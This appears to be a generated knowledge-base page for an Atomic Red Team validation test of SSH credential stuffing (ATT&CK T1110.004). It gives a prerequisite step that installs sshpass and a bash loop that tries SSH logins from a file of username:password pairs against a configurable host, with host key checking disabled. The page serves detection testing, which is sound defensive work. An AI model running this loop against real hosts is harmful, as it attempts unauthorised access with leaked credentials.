---
atomic_guid: "4f08197a-2a8a-472d-9589-cd2895ef22ad"
title: "SSH Credential Stuffing From Linux"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.004"
attack_technique_name: "Brute Force: Credential Stuffing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml"
build_date: "2026-04-26 14:38:39"
executor: "bash"
aliases:
  - "4f08197a-2a8a-472d-9589-cd2895ef22ad"
  - "SSH Credential Stuffing From Linux"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# SSH Credential Stuffing From Linux

Using username,password combination from a password dump to login over SSH.

## Metadata

- Atomic GUID: 4f08197a-2a8a-472d-9589-cd2895ef22ad
- Technique: T1110.004: Brute Force: Credential Stuffing
- Platforms: linux
- Executor: bash
- Elevation Required: False
- Dependency Executor: bash
- Source Path: atomics/T1110.004/T1110.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.004]]

## Input Arguments

### target_host

- description: IP Address / Hostname you want to target.
- type: string
- default: localhost

## Dependencies

Requires SSHPASS

### Prerequisite Check

```text
if [ -x "$(command -v sshpass)" ]; then exit 0; else exit 1; fi;
```

### Get Prerequisite

```text
if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo "This test requires sshpass" ; fi ;
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.004/T1110.004.yaml)
